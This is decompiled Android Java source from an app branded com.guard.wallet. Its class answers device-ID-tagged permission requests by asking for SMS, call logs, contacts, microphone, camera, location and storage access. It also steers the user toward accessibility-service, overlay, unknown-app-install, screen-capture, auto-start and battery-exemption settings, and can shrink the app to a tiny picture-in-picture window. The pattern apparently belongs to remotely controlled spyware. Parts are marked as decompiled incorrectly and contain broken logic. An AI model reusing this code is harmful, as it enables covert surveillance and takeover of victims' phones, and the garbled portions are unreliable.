package p002e;

import a1.AbstractC0026q;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.PictureInPictureParams;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.graphics.Rect;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Process;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.util.Rational;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.PermissionRequestVO;
import com.guard.wallet.req.PermissionResponseVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.lang.ref.WeakReference;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;

/* renamed from: e.b */
/* loaded from: classes.dex */
public final class C0262b {

    /* renamed from: a */
    public static volatile C0262b f433a;

    /* renamed from: b */
    public static volatile WeakReference f434b;

    /* renamed from: c */
    public static final AtomicBoolean f435c = new AtomicBoolean(false);

    /* renamed from: d */
    public static final ScheduledExecutorService f436d = Executors.newSingleThreadScheduledExecutor();

    /* renamed from: a */
    public static Activity m735a() {
        if (f434b == null) {
            return null;
        }
        return (Activity) f434b.get();
    }

    /* JADX WARN: Removed duplicated region for block: B:15:0x0033 A[Catch: all -> 0x003c, TryCatch #0 {, blocks: (B:4:0x0003, B:6:0x0007, B:9:0x0010, B:11:0x001c, B:12:0x0023, B:13:0x002f, B:15:0x0033, B:16:0x003a, B:20:0x0027), top: B:3:0x0003 }] */
    /* renamed from: b */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m736b(Activity activity) {
        synchronized (C0262b.class) {
            if (f434b != null && f434b.get() != null) {
                if (!Objects.equals(activity, f434b.get())) {
                    f434b = new WeakReference(activity);
                    AbstractC0252h.m688I();
                }
                if (f433a == null) {
                    f433a = new C0262b();
                }
            }
            f434b = new WeakReference(activity);
            AbstractC0252h.m688I();
            if (f433a == null) {
            }
        }
    }

    /* renamed from: c */
    public static boolean m737c() {
        return (f434b == null || f434b.get() == null || !f435c.get()) ? false : true;
    }

    /* renamed from: d */
    public static void m738d() {
        if (f434b == null || f434b.get() == null) {
            return;
        }
        AtomicBoolean atomicBoolean = f435c;
        if (atomicBoolean.get()) {
            ((Activity) f434b.get()).finishAndRemoveTask();
            atomicBoolean.set(false);
        }
    }

    /* renamed from: e */
    public static void m739e() {
        PictureInPictureParams.Builder seamlessResizeEnabled;
        try {
            int i2 = Build.VERSION.SDK_INT;
            if (f434b == null || f434b.get() == null) {
                return;
            }
            PictureInPictureParams.Builder sourceRectHint = new PictureInPictureParams.Builder().setAspectRatio(new Rational(50, 20)).setSourceRectHint(new Rect(0, 0, 50, 20));
            if (i2 >= 31) {
                seamlessResizeEnabled = sourceRectHint.setSeamlessResizeEnabled(true);
                seamlessResizeEnabled.setAutoEnterEnabled(true);
            }
            if (((Activity) f434b.get()).enterPictureInPictureMode(sourceRectHint.build())) {
                f435c.set(true);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("AbsMainActivity", e2);
        }
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code restructure failed: missing block: B:126:0x0132, code lost:
    
        if (r0.equals("android.permission-group.CONTACTS") == false) goto L76;
     */
    /* JADX WARN: Code restructure failed: missing block: B:253:0x069e, code lost:
    
        if (r2 != 0) goto L311;
     */
    /* renamed from: f */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static PermissionResponseVO m740f(PermissionRequestVO permissionRequestVO) {
        char c;
        char c2;
        ComponentName componentName;
        Intent intent;
        StringBuilder sb;
        PermissionResponseVO permissionResponseVO = new PermissionResponseVO();
        permissionResponseVO.setDeviceId(AbstractC0252h.m708l("deviceId"));
        permissionResponseVO.setRequested(0);
        permissionResponseVO.setGranted(0);
        if (m735a() != null && permissionRequestVO != null && permissionRequestVO.getRequestCode() != null && permissionRequestVO.getRequestCode().intValue() > 0) {
            if (!AbstractC0026q.m151B(permissionRequestVO.getGroupValue())) {
                String groupValue = permissionRequestVO.getGroupValue();
                int intValue = permissionRequestVO.getRequestCode().intValue();
                PermissionResponseVO permissionResponseVO2 = new PermissionResponseVO();
                permissionResponseVO2.setDeviceId(AbstractC0252h.m708l("deviceId"));
                permissionResponseVO2.setRequested(0);
                permissionResponseVO2.setGranted(0);
                if (m735a() != null && !AbstractC0026q.m151B(groupValue)) {
                    groupValue.getClass();
                    switch (groupValue.hashCode()) {
                        case -1639857183:
                            break;
                        case -1410061184:
                            if (groupValue.equals("android.permission-group.PHONE")) {
                                r2 = 1;
                                break;
                            }
                            r2 = 65535;
                            break;
                        case -1250730292:
                            if (groupValue.equals("android.permission-group.CALENDAR")) {
                                r2 = 2;
                                break;
                            }
                            r2 = 65535;
                            break;
                        case -1243751087:
                            if (groupValue.equals("android.permission-group.CALL_LOG")) {
                                r2 = 3;
                                break;
                            }
                            r2 = 65535;
                            break;
                        case -1140935117:
                            if (groupValue.equals("android.permission-group.CAMERA")) {
                                r2 = 4;
                                break;
                            }
                            r2 = 65535;
                            break;
                        case -746978218:
                            if (groupValue.equals("android.permission-group.READ_MEDIA_VISUAL")) {
                                r2 = 5;
                                break;
                            }
                            r2 = 65535;
                            break;
                        case -43134093:
                            if (groupValue.equals("android.permission-group.READ_MEDIA_AURAL")) {
                                r2 = 6;
                                break;
                            }
                            r2 = 65535;
                            break;
                        case 225035509:
                            if (groupValue.equals("android.permission-group.ACTIVITY_RECOGNITION")) {
                                r2 = 7;
                                break;
                            }
                            r2 = 65535;
                            break;
                        case 421761675:
                            if (groupValue.equals("android.permission-group.SENSORS")) {
                                r2 = '\b';
                                break;
                            }
                            r2 = 65535;
                            break;
                        case 828638019:
                            if (groupValue.equals("android.permission-group.LOCATION")) {
                                r2 = '\t';
                                break;
                            }
                            r2 = 65535;
                            break;
                        case 852078861:
                            if (groupValue.equals("android.permission-group.STORAGE")) {
                                r2 = '\n';
                                break;
                            }
                            r2 = 65535;
                            break;
                        case 1485193722:
                            if (groupValue.equals("android.permission-group.NOTIFICATIONS")) {
                                r2 = 11;
                                break;
                            }
                            r2 = 65535;
                            break;
                        case 1581272376:
                            if (groupValue.equals("android.permission-group.MICROPHONE")) {
                                r2 = '\f';
                                break;
                            }
                            r2 = 65535;
                            break;
                        case 1720655883:
                            if (groupValue.equals("android.permission-group.NEARBY_DEVICES")) {
                                r2 = '\r';
                                break;
                            }
                            r2 = 65535;
                            break;
                        case 1795181803:
                            if (groupValue.equals("android.permission-group.SMS")) {
                                r2 = 14;
                                break;
                            }
                            r2 = 65535;
                            break;
                        default:
                            r2 = 65535;
                            break;
                    }
                    switch (r2) {
                        case 0:
                            int checkSelfPermission = ContextCompat.checkSelfPermission(m735a(), "android.permission.WRITE_CONTACTS");
                            if (ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_CONTACTS") != 0 || checkSelfPermission != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.WRITE_CONTACTS", "android.permission.READ_CONTACTS"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case 1:
                            int checkSelfPermission2 = ContextCompat.checkSelfPermission(m735a(), "android.permission.CALL_PHONE");
                            int checkSelfPermission3 = ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_PHONE_STATE");
                            if (checkSelfPermission2 != 0 || checkSelfPermission3 != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.CALL_PHONE", "android.permission.READ_PHONE_STATE"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case 2:
                            int checkSelfPermission4 = ContextCompat.checkSelfPermission(m735a(), "android.permission.WRITE_CALENDAR");
                            if (ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_CALENDAR") != 0 || checkSelfPermission4 != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.WRITE_CALENDAR", "android.permission.READ_CALENDAR"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case 3:
                            int checkSelfPermission5 = ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_CALL_LOG");
                            int checkSelfPermission6 = ContextCompat.checkSelfPermission(m735a(), "android.permission.WRITE_CALL_LOG");
                            if (checkSelfPermission5 != 0 || checkSelfPermission6 != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case 4:
                            if (ContextCompat.checkSelfPermission(m735a(), "android.permission.CAMERA") != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.CAMERA"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case 5:
                            if (Build.VERSION.SDK_INT >= 33) {
                                int checkSelfPermission7 = ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_MEDIA_IMAGES");
                                int checkSelfPermission8 = ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_MEDIA_VIDEO");
                                if (checkSelfPermission7 != 0 || checkSelfPermission8 != 0) {
                                    ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"}, intValue);
                                    permissionResponseVO2.setRequested(1);
                                    permissionResponseVO2.setGranted(0);
                                    break;
                                }
                                permissionResponseVO2.setRequested(0);
                                permissionResponseVO2.setGranted(1);
                                break;
                            }
                            break;
                        case 6:
                            if (Build.VERSION.SDK_INT >= 33) {
                                if (ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_MEDIA_AUDIO") != 0) {
                                    ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.READ_MEDIA_AUDIO"}, intValue);
                                    permissionResponseVO2.setRequested(1);
                                    permissionResponseVO2.setGranted(0);
                                    break;
                                }
                                permissionResponseVO2.setRequested(0);
                                permissionResponseVO2.setGranted(1);
                                break;
                            }
                            break;
                        case 7:
                            if (Build.VERSION.SDK_INT >= 29) {
                                if (ContextCompat.checkSelfPermission(m735a(), "android.permission.ACTIVITY_RECOGNITION") != 0) {
                                    ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.ACTIVITY_RECOGNITION"}, intValue);
                                    permissionResponseVO2.setRequested(1);
                                    permissionResponseVO2.setGranted(0);
                                    break;
                                }
                                permissionResponseVO2.setRequested(0);
                                permissionResponseVO2.setGranted(1);
                                break;
                            }
                            break;
                        case '\b':
                            if (ContextCompat.checkSelfPermission(m735a(), "android.permission.BODY_SENSORS") != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.BODY_SENSORS"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case '\t':
                            int checkSelfPermission9 = ContextCompat.checkSelfPermission(m735a(), "android.permission.ACCESS_FINE_LOCATION");
                            int checkSelfPermission10 = ContextCompat.checkSelfPermission(m735a(), "android.permission.ACCESS_COARSE_LOCATION");
                            if (checkSelfPermission9 != 0 || checkSelfPermission10 != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case '\n':
                            int checkSelfPermission11 = ContextCompat.checkSelfPermission(m735a(), "android.permission.WRITE_EXTERNAL_STORAGE");
                            int checkSelfPermission12 = ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_EXTERNAL_STORAGE");
                            if (checkSelfPermission11 != 0 || checkSelfPermission12 != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case 11:
                            if (Build.VERSION.SDK_INT >= 33) {
                                if (ContextCompat.checkSelfPermission(m735a(), "android.permission.POST_NOTIFICATIONS") != 0) {
                                    ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.POST_NOTIFICATIONS"}, intValue);
                                    permissionResponseVO2.setRequested(1);
                                    permissionResponseVO2.setGranted(0);
                                    break;
                                }
                                permissionResponseVO2.setRequested(0);
                                permissionResponseVO2.setGranted(1);
                                break;
                            }
                            break;
                        case '\f':
                            if (ContextCompat.checkSelfPermission(m735a(), "android.permission.RECORD_AUDIO") != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.RECORD_AUDIO"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                        case '\r':
                            if (Build.VERSION.SDK_INT >= 33) {
                                if (ContextCompat.checkSelfPermission(m735a(), "android.permission.NEARBY_WIFI_DEVICES") != 0) {
                                    ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.NEARBY_WIFI_DEVICES"}, intValue);
                                    permissionResponseVO2.setRequested(1);
                                    permissionResponseVO2.setGranted(0);
                                    break;
                                }
                                permissionResponseVO2.setRequested(0);
                                permissionResponseVO2.setGranted(1);
                                break;
                            }
                            break;
                        case 14:
                            int checkSelfPermission13 = ContextCompat.checkSelfPermission(m735a(), "android.permission.RECEIVE_SMS");
                            int checkSelfPermission14 = ContextCompat.checkSelfPermission(m735a(), "android.permission.READ_SMS");
                            if (checkSelfPermission13 != 0 || checkSelfPermission14 != 0) {
                                ActivityCompat.requestPermissions(m735a(), new String[]{"android.permission.RECEIVE_SMS", "android.permission.READ_SMS"}, intValue);
                                permissionResponseVO2.setRequested(1);
                                permissionResponseVO2.setGranted(0);
                                break;
                            }
                            permissionResponseVO2.setRequested(0);
                            permissionResponseVO2.setGranted(1);
                            break;
                    }
                }
                return permissionResponseVO2;
            }
            if (!AbstractC0026q.m151B(permissionRequestVO.getPermissionValue())) {
                permissionResponseVO.setRequestCode(permissionRequestVO.getRequestCode());
                String permissionValue = permissionRequestVO.getPermissionValue();
                permissionValue.getClass();
                switch (permissionValue.hashCode()) {
                    case -1855887118:
                        if (permissionValue.equals("android.permission.AUTO_START")) {
                            c = 0;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1106439520:
                        if (permissionValue.equals("android.permission.USAGE_ACCESS_SETTINGS")) {
                            c = 1;
                            break;
                        }
                        c = 65535;
                        break;
                    case -431919634:
                        if (permissionValue.equals("android.permission.ACCESSIBILITY")) {
                            c = 2;
                            break;
                        }
                        c = 65535;
                        break;
                    case -160041744:
                        if (permissionValue.equals("android.permission.OVERLAY")) {
                            c = 3;
                            break;
                        }
                        c = 65535;
                        break;
                    case 92962859:
                        if (permissionValue.equals("android.permission.MANAGE_UNKNOWN_APP_SOURCES")) {
                            c = 4;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1174723143:
                        if (permissionValue.equals("android.permission.IGNORE_BATTERY_OPTIMIZATIONS")) {
                            c = 5;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1523123434:
                        if (permissionValue.equals("android.permission.MEDIA_PROJECTION")) {
                            c = 6;
                            break;
                        }
                        c = 65535;
                        break;
                    default:
                        c = 65535;
                        break;
                }
                Intent intent2 = null;
                String packageName = null;
                intent2 = null;
                switch (c) {
                    case 0:
                        if (m735a() != null) {
                            if (ContextCompat.checkSelfPermission(m735a(), "android.permission.RECEIVE_BOOT_COMPLETED") == 0 && !AbstractC0249e.m618g()) {
                                AbstractC0252h.m705i("has_receive_completed");
                                AbstractC0252h.m706j("last_req_start_timestamp");
                                System.currentTimeMillis();
                            }
                            Activity m735a = m735a();
                            String str = Build.MANUFACTURER;
                            Intent intent3 = new Intent();
                            intent3.addFlags(268435456);
                            String lowerCase = str.toLowerCase();
                            lowerCase.getClass();
                            switch (lowerCase.hashCode()) {
                                case -1320380160:
                                    if (lowerCase.equals("oneplus")) {
                                        c2 = 0;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case -1206476313:
                                    if (lowerCase.equals("huawei")) {
                                        c2 = 1;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case -759499589:
                                    if (lowerCase.equals("xiaomi")) {
                                        c2 = 2;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case -719460456:
                                    if (lowerCase.equals("yulong")) {
                                        c2 = 3;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 50733:
                                    if (lowerCase.equals("360")) {
                                        c2 = 4;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 3242770:
                                    if (lowerCase.equals("itel")) {
                                        c2 = 5;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 3318203:
                                    if (lowerCase.equals("letv")) {
                                        c2 = 6;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 3418016:
                                    if (lowerCase.equals("oppo")) {
                                        c2 = 7;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 3620012:
                                    if (lowerCase.equals("vivo")) {
                                        c2 = '\b';
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 99462250:
                                    if (lowerCase.equals("honor")) {
                                        c2 = '\t';
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 103777484:
                                    if (lowerCase.equals("meizu")) {
                                        c2 = '\n';
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 110235987:
                                    if (lowerCase.equals("tecno")) {
                                        c2 = 11;
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 1864941562:
                                    if (lowerCase.equals("samsung")) {
                                        c2 = '\f';
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                case 1945248885:
                                    if (lowerCase.equals("infinix")) {
                                        c2 = '\r';
                                        break;
                                    }
                                    c2 = 65535;
                                    break;
                                default:
                                    c2 = 65535;
                                    break;
                            }
                            switch (c2) {
                                case 0:
                                    componentName = new ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity");
                                    break;
                                case 1:
                                case '\t':
                                    Log.d("自启动管理 >>>>", "getAutostartSettingIntent: 华为");
                                    componentName = new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity");
                                    break;
                                case 2:
                                    componentName = new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
                                    break;
                                case 3:
                                case 4:
                                    componentName = new ComponentName("com.yulong.android.coolsafe", "com.yulong.android.coolsafe.ui.activity.autorun.AutoRunListActivity");
                                    break;
                                case 5:
                                case 11:
                                case '\r':
                                    componentName = new ComponentName("com.transsion.phonemaster", "com.cyin.himgr.autostart.AutoStartActivity");
                                    break;
                                case 6:
                                    intent3.setAction("com.letv.android.permissionautoboot");
                                    componentName = null;
                                    break;
                                case 7:
                                    componentName = new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity");
                                    break;
                                case '\b':
                                    componentName = new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity");
                                    break;
                                case '\n':
                                    componentName = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.SmartBGActivity");
                                    break;
                                case '\f':
                                    componentName = new ComponentName("com.samsung.android.sm", "com.samsung.android.sm.app.dashboard.SmartManagerDashBoardActivity");
                                    break;
                                default:
                                    new Intent("android.settings.APPLICATION_DETAILS_SETTINGS").setData(Uri.fromParts("package", m735a.getPackageName(), null));
                                    intent3 = new Intent("android.settings.SETTINGS");
                                    componentName = null;
                                    break;
                            }
                            intent3.setComponent(componentName);
                            List<ResolveInfo> queryIntentActivities = m735a.getPackageManager().queryIntentActivities(intent3, 65536);
                            if (queryIntentActivities != null && queryIntentActivities.size() > 0) {
                                intent2 = intent3;
                            }
                            if (intent2 != null) {
                                if (m735a() != null) {
                                    m735a().startActivity(intent2);
                                }
                                AbstractC0252h.m683D(Long.valueOf(System.currentTimeMillis()), "last_req_start_timestamp");
                                r2 = 1;
                                break;
                            }
                        }
                        break;
                    case 1:
                        Activity m735a2 = m735a();
                        if ((((AppOpsManager) m735a2.getSystemService("appops")).checkOpNoThrow("android:get_usage_stats", Process.myUid(), m735a2.getPackageName()) == 0 ? (char) 1 : (char) 0) == 0) {
                            intent = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
                            m741g(intent, permissionRequestVO.getRequestCode().intValue());
                            permissionResponseVO.setRequested(1);
                            permissionResponseVO.setGranted(0);
                            break;
                        }
                        permissionResponseVO.setRequested(0);
                        permissionResponseVO.setGranted(1);
                        break;
                    case 2:
                        Activity m735a3 = m735a();
                        String name = MyAccessibilityService.class.getName();
                        List<ActivityManager.RunningServiceInfo> runningServices = ((ActivityManager) m735a3.getSystemService("activity")).getRunningServices(100);
                        if (!runningServices.isEmpty()) {
                            int i2 = 0;
                            while (true) {
                                if (i2 < runningServices.size()) {
                                    if (runningServices.get(i2).service.getClassName().equals(name)) {
                                        r2 = 1;
                                    } else {
                                        i2++;
                                    }
                                }
                            }
                        }
                        if (r2 == 0) {
                            AbstractC0251g.V0();
                            permissionResponseVO.setRequested(1);
                            permissionResponseVO.setGranted(0);
                            break;
                        }
                        permissionResponseVO.setRequested(0);
                        permissionResponseVO.setGranted(1);
                        break;
                    case 3:
                        if (!Settings.canDrawOverlays(m735a())) {
                            intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                            sb = new StringBuilder("package:");
                            packageName = MainApplication.getAppContext().getPackageName();
                            sb.append(packageName);
                            intent.setData(Uri.parse(sb.toString()));
                            m741g(intent, permissionRequestVO.getRequestCode().intValue());
                            permissionResponseVO.setRequested(1);
                            permissionResponseVO.setGranted(0);
                            break;
                        }
                        permissionResponseVO.setRequested(0);
                        permissionResponseVO.setGranted(1);
                        break;
                    case 4:
                        if (!m735a().getPackageManager().canRequestPackageInstalls()) {
                            m741g(new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES", Uri.parse("package:" + m735a().getPackageName())), permissionRequestVO.getRequestCode().intValue());
                            permissionResponseVO.setRequested(1);
                            permissionResponseVO.setGranted(0);
                            break;
                        }
                        permissionResponseVO.setRequested(0);
                        permissionResponseVO.setGranted(1);
                        break;
                    case 5:
                        if (!AbstractC0251g.o0()) {
                            intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                            sb = new StringBuilder("package:");
                            if (m735a() != null) {
                                packageName = m735a().getPackageName();
                            }
                            sb.append(packageName);
                            intent.setData(Uri.parse(sb.toString()));
                            m741g(intent, permissionRequestVO.getRequestCode().intValue());
                            permissionResponseVO.setRequested(1);
                            permissionResponseVO.setGranted(0);
                            break;
                        }
                        permissionResponseVO.setRequested(0);
                        permissionResponseVO.setGranted(1);
                        break;
                    case 6:
                        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) m735a().getSystemService("media_projection");
                        if (mediaProjectionManager != null) {
                            intent = mediaProjectionManager.createScreenCaptureIntent();
                            m741g(intent, permissionRequestVO.getRequestCode().intValue());
                            permissionResponseVO.setRequested(1);
                            permissionResponseVO.setGranted(0);
                            break;
                        }
                        break;
                    default:
                        if (ContextCompat.checkSelfPermission(m735a(), permissionRequestVO.getPermissionValue()) != 0) {
                            ActivityCompat.requestPermissions(m735a(), new String[]{permissionRequestVO.getPermissionValue()}, permissionRequestVO.getRequestCode().intValue());
                            permissionResponseVO.setRequested(1);
                            permissionResponseVO.setGranted(0);
                            break;
                        }
                        permissionResponseVO.setRequested(0);
                        permissionResponseVO.setGranted(1);
                        break;
                }
            }
        }
        return permissionResponseVO;
    }

    /* renamed from: g */
    public static void m741g(Intent intent, int i2) {
        if (m735a() != null) {
            try {
                m735a().startActivityForResult(intent, i2);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AbsMainActivity", e2);
            }
        }
    }
}
